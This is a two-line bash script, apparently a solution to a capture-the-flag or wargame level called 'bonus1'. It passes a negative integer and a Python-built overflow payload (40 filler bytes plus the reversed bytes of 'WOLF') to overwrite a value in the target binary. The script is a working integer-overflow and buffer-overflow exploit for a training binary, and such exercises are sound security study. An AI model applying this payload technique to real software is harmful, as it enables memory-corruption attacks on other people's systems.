#!/bin/bash
./bonus1 -2147483608 $(python -c "print('A' * 40 + '\x57\x4f\x4c\x46'[::-1])")
